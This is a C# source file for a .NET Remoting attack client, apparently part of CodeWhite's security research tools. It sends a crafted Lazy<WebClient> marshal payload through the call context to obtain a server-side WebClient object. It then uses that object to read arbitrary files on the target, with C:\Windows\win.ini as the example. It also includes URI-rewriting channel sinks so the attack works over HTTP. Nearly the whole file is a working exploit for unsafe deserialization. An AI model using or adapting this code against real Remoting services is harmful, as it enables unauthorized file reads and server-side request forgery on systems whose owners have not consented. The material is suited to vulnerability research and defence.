using System;
using System.Net;
using System.Runtime.Remoting;
using System.IO;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Http;
using System.Collections;
using CodeWhite.Remoting.Shared;

namespace CodeWhite.Remoting.RemotingClient_MBRO_Lazy
{
    internal class Program
    {
        static readonly string ASSEMBLY_LOCATION = Assembly.GetExecutingAssembly().Location;

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.Error.WriteLine($"usage: {Path.GetFileName(ASSEMBLY_LOCATION)} objUrl fileUrl");
                Console.Error.WriteLine();
                Console.Error.WriteLine("example:");
                Console.Error.WriteLine($@"  {Path.GetFileName(ASSEMBLY_LOCATION)} tcp://127.0.0.1:12345/DummyService C:\Windows\win.ini");
                Environment.Exit(-1);
            }

            Uri objUrl = new Uri(args[0]);
            Uri fileUrl = new Uri(args[1]);

            ConfigureClientChannel(objUrl);

            // retrieve remote WebClient
            var mbro = GetRemoteMarshalByRefObjectInstance<WebClient>(objUrl);

            // print info
            Utils.PrintInfo(mbro);

            // use remote `WebClient`
            WebClient remoteWebClient = (WebClient)mbro;
            Console.WriteLine(remoteWebClient.DownloadString(fileUrl));
        }

        private static T GetRemoteMarshalByRefObjectInstance<T>(Uri objUrl) where T : MarshalByRefObject
        {
            const string key = "MBRO";
            var payload = new UniversalMarshal("mscorlib", typeof(Lazy<T>).FullName);
            var logicalCallContextData = new Dictionary<string, object>()
            {
                { key, payload }
            };
            var methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);
            if (methodReturnMessage.Exception != null)
            {
                throw methodReturnMessage.Exception;
            }
            var lazy = (Lazy<T>)methodReturnMessage.LogicalCallContext.GetData(key);
            return (T)lazy.GetType().GetProperty("Value").GetValue(lazy, null);
        }

        private static void ConfigureClientChannel(Uri objUrl)
        {
            bool isHttp = objUrl.Scheme.Equals(Uri.UriSchemeHttp, StringComparison.OrdinalIgnoreCase)
                || objUrl.Scheme.Equals(Uri.UriSchemeHttps, StringComparison.OrdinalIgnoreCase);

            if (!isHttp)
            {
                RemotingConfiguration.Configure($"{ASSEMBLY_LOCATION}.config", false);
                return;
            }

            var formatter = new System.Runtime.Remoting.Channels.BinaryClientFormatterSinkProvider();
            formatter.Next = new ChannelUriFixingClientChannelSinkProvider(objUrl);
            HttpClientChannel channel = new HttpClientChannel(new Hashtable(), formatter);
            ChannelServices.RegisterChannel(channel, false);
        }
    }

    internal class ChannelUriFixingClientChannelSinkProvider : IClientChannelSinkProvider
    {
        private readonly string publicHost;
        private readonly int publicPort;

        public IClientChannelSinkProvider Next { get; set; }

        public ChannelUriFixingClientChannelSinkProvider(Uri objUrl)
        {
            if (objUrl == null) throw new ArgumentNullException(nameof(objUrl));

            this.publicHost = objUrl.Host;
            this.publicPort = objUrl.Port;
        }

        public IClientChannelSink CreateSink(IChannelSender channel, string url, object remoteChannelData)
        {
            IClientChannelSink nextSink = null;
            if (Next != null)
            {
                nextSink = Next.CreateSink(channel, RewriteUrl(url), remoteChannelData);
            }

            return new ChannelUriFixingClientChannelSink(publicHost, publicPort, nextSink);
        }

        private string RewriteUrl(string url)
        {
            if (string.IsNullOrWhiteSpace(url))
            {
                return url;
            }

            Uri uri;
            if (!Uri.TryCreate(url, UriKind.Absolute, out uri))
            {
                return url;
            }

            return $"{uri.Scheme}://{publicHost}:{publicPort}{uri.PathAndQuery}";
        }
    }

    internal class ChannelUriFixingClientChannelSink : IClientChannelSink
    {
        private readonly string publicHost;
        private readonly int publicPort;
        private readonly IClientChannelSink nextSink;

        public ChannelUriFixingClientChannelSink(string publicHost, int publicPort, IClientChannelSink nextSink)
        {
            this.publicHost = publicHost;
            this.publicPort = publicPort;
            this.nextSink = nextSink;
        }

        public IClientChannelSink NextChannelSink => nextSink;

        public System.Collections.IDictionary Properties => new System.Collections.Hashtable();

        public void ProcessMessage(IMessage msg, ITransportHeaders requestHeaders, Stream requestStream, out ITransportHeaders responseHeaders, out Stream responseStream)
        {
            string url = (string)requestHeaders["__RequestUri"];
            if (url != null)
            {
                Uri uri = new Uri(url);
                string newUrl = $"{uri.Scheme}://{publicHost}:{publicPort}{uri.PathAndQuery}";
                requestHeaders["__RequestUri"] = newUrl;
            }

            if (nextSink == null)
            {
                throw new InvalidOperationException("Next channel sink is not configured.");
            }
            nextSink.ProcessMessage(msg, requestHeaders, requestStream, out responseHeaders, out responseStream);
        }

        public void AsyncProcessRequest(IClientChannelSinkStack sinkStack, IMessage msg, ITransportHeaders headers, Stream stream)
        {
            string url = (string)headers["__RequestUri"];
            if (url != null)
            {
                Uri uri = new Uri(url);
                string newUrl = $"{uri.Scheme}://{publicHost}:{publicPort}{uri.PathAndQuery}";
                headers["__RequestUri"] = newUrl;
            }

            if (nextSink == null)
            {
                throw new InvalidOperationException("Next channel sink is not configured.");
            }
            nextSink.AsyncProcessRequest(sinkStack, msg, headers, stream);
        }

        public void AsyncProcessResponse(IClientResponseChannelSinkStack sinkStack, object state, ITransportHeaders headers, Stream stream)
        {
            if (nextSink == null)
            {
                throw new InvalidOperationException("Next channel sink is not configured.");
            }
            nextSink.AsyncProcessResponse(sinkStack, state, headers, stream);
        }

        public Stream GetRequestStream(IMessage msg, ITransportHeaders headers)
        {
            if (nextSink == null)
            {
                throw new InvalidOperationException("Next channel sink is not configured.");
            }
            return nextSink.GetRequestStream(msg, headers);
        }
    }
}
